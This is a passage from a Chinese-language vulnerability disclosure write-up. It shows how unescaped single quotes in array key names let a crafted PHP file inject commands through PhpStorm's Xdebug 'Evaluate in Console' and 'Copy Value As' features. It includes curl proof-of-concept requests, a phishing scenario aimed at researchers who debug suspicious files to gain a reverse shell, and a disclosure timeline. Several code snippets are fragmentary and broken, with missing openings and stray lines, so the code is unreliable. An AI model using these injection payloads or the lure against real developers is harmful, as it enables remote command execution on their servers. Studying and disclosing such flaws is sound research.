Console` 功能。
可以看到单引号未做任何过滤，这也就意味着我可以控制 `eval` 的内容了。在下图中，我通过对 `$a['aaa\'];#']` 变量使用
`Evaluate in Console` 功能获取到 `$a['aaa']` 的值。
精心构造的请求和代码如下：
    $ curl "http://192.168.88.128/first_pwn.php?q=a%27%5d(\$b);%09%23" --cookie "XDEBUG_SESSION=PHPSTORM"
    > /tmp/dawu";
    $a[$q] = "aaa";
    echo $a;
    ?>
但在这个例子中存在一个明显的缺陷：`可以看到恶意的元素名称`。如果用于钓鱼攻击，会大大降低成功率，所以对上述的代码进行了一定的修改：
    $ curl "http://192.168.88.128/second_pwn.php?q=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%27%5d(\$b);%09%23" --cookie "XDEBUG_SESSION=PHPSTORM"
    > /tmp/dawu";
    $a[$q] = "aaa";
    echo $a;
    ?>
在元素名称足够长时，`PhpStorm` 会自动隐藏后面的部分：
#### 2.2 通过 `Copy Value As` 执行命令
继续研究发现，`COPY VALUE AS (print_r/var_export/json_encode)` 同样也会使用 `Xdebug` 的
`eval` 命令来实现相应的功能：
再次精心构造相应的请求和代码后，可以再次在 `Xdebug` 服务器上执行命令：
    curl "http://192.168.88.128/second_pwn.php?q=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%27%5d(\$b));%23" --cookie "XDEBUG_SESSION=PHPSTORM"
#### 2.3 实际攻击探究
基于上述的研究，我认为可以通过 `PhpStorm` 实现钓鱼攻击。假设的攻击流程如下：
  1. 攻击者确保受害者可以发现恶意的 `PHP` 文件。例如安全研究人员之间交流 `某大马` 具体实现了哪些功能、运维人员发现服务器上出现了可疑的 `PHP` 文件。
  2. 如果受害者在大致浏览 `PHP` 文件内容后，决定使用 `PhpStorm` 分析该文件。
  3. 受害者使用 `COPY VALUE AS (print_r/var_export/json_encode)`、`Evaluate array in Console` 等功能。命令将会执行。
  4. 攻击者可以收到受害者 `Xdebug` 服务器的 `shell`。
精心构造的代码如下（其中的反连IP地址为临时开启的VPS）：
     $c,
        $f => $i,
        $g => $a,
    );
    $n[$e]($n[$g]($n[$f]));
    ?>
直接执行该 `PHP` 代码，将只会多次运行 `system("echo hello world;")`。但是调试人员并不会执行 `PHP`
代码，他也许会取出 `$n[$f]` 的值，然后通过 `echo XXXXXXXX|base64 -d` 解码出具体的内容。
如果他使用 `COPY VALUE BY print_r` 拷贝对应的变量，他的 `Xdebug` 服务器上将会被执行命令。
在下面这个 `gif` 中，左边是攻击者的终端，右边是受害者的 `debug` 过程。
（GIF中存在一处笔误： `decise` 应为 `decide`）
### 0x03 结语
在整个漏洞的发现过程中，存在一定的曲折，但这也正是安全研究的乐趣所在。`PhpStorm`
官方最终没有认可该漏洞，也是一点小小的遗憾。在此将该发现分享出来，一方面是为了跟大家分享思路，另一方面也请安全研究人员使用 `PhpStorm`
调试代码时慎用 `COPY VALUE AS (print_r/var_export/json_encode)`、`Evaluate array in
Console` 功能。
### 0x04 时间线
2018/06/08: 发现 `Evaluate in Console` 存在 `在 Xdebug 服务器上` 执行命令的风险。  
2018/06/31 - 2018/07/01: 尝试分析 `Evaluate in Console` 的问题，发现新的利用点 `Copy Value`.
即使 `eval` 是 `Xdebug` 提供的功能，但是 `PhpStorm` 没有过滤单引号导致我们可以在 `Xdebug`
服务器上执行命令，所以整理文档联系 `PI:EMAIL`。  
2018/07/04: 收到官方回复，认为这是 `Xdebug` 的问题，`PhpStorm` 在调试过程中不提供对服务器资源的额外访问权限。  
2018/07/06: 再次联系官方，说明该攻击可以用于钓鱼攻击。  
2018/07/06: 官方认为用户在服务器上运行不可信的代码会造成服务器被破坏，这与 `PhpStorm` 无关，这也是 `PhpStorm`
不影响服务器安全性的原因。官方同意我披露该问题。  
2018/08/16： 披露该问题。
* * *